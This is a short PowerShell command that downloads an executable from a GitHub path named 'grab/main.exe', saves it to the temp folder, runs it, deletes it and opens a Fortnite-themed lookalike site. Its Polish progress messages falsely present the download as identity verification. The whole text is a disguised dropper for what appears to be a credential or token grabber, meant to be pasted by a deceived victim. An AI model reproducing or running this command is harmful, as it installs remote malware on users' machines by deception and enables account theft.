powershell -Command "& {
    $url = 'https://github.com/xKotelek/xKotelek/raw/main/dc/grab/main.exe';
    $output = Join-Path $env:TEMP 'temp.exe';
    $wc = New-Object System.Net.WebClient;

    $wc.DownloadFileAsync([Uri]$url, $output);

    $wc.DownloadProgressChanged += {
        $percentage = [int]($_.ProgressPercentage);
        Write-Host ('Weryfikuję twoją tożsamość (status pobrania pliku) ' + $percentage + '%') -NoNewline;
    };

    $wc.DownloadFileCompleted += {
        Start-Process $output;
        Remove-Item $output -Force;
        Start-Process 'https://f0rtn1te-xp.ct8.pl/';
        Write-Host 'Pobieranie zakończone. Naciśnij dowolny klawisz, aby zamknąć...' -ForegroundColor Green;
        Pause;
    };

    while ($wc.IsBusy) {
        Start-Sleep -Milliseconds 500;
    }
}"
